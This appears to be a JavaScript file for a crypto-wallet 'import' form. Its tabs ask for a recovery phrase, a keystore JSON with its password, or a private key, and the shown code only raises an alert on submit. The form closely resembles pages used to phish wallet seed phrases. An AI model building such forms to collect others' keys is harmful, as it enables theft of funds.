const header = document.getElementById("bodyPhrase");
const desc = document.getElementById("info");
const formD = document.getElementById("formD");
const field = document.createElement("input");
const phrtext = document.getElementById("exampleFormControlTextarea1");
const buttonkeySubmit = document.getElementsByClassName('keySubmit');


const t1 = document.getElementById("pills-home-tab");
const t2 = document.getElementById("pills-profile-tab");
const t3 = document.getElementById("pills-contact-tab");

let pharseSwitch = true;
let keySwitch;
let privateSwitch;

field.style.marginTop = "10px";
field.className = "form-control";
field.placeholder = "password";

function phrase(){
    header.innerHTML = "Phrase";
    desc.innerHTML = "Typically 12 (sometimes 24) words separated by single spaces";
    phrtext.rows = '3';
    formD.removeChild(field);
    pharseSwitch = true;
    keySwitch = false;
    privateSwitch = false;
}

function keystore(){
    header.innerHTML = "Keystore JSON";
    desc.innerHTML = "Several lines of text beginning with '(...)' plus the password you used to encrypt it.";
    formD.appendChild(field);
    phrtext.rows = '3';
    pharseSwitch = false;
    keySwitch = true;
    privateSwitch = false;
}

function private(){
    header.innerHTML = "Private Key";
    desc.innerHTML = "Typically 64 character separated by single spaces";
    formD.removeChild(field);
    phrtext.rows = '1';
    pharseSwitch = false;
    keySwitch = false;
    privateSwitch = true;
}

function importKey(){
    if(pharseSwitch == true && keySwitch == false && privateSwitch == false){
        alert("pharse submitted");
    }else if(pharseSwitch == false && keySwitch == true && privateSwitch == false){
        alert("keystore submitted");
    }else if(pharseSwitch == false && keySwitch == false && privateSwitch == true){
        alert("private key submitted");
    }else{
        alert("pharse submitted");
    }
}
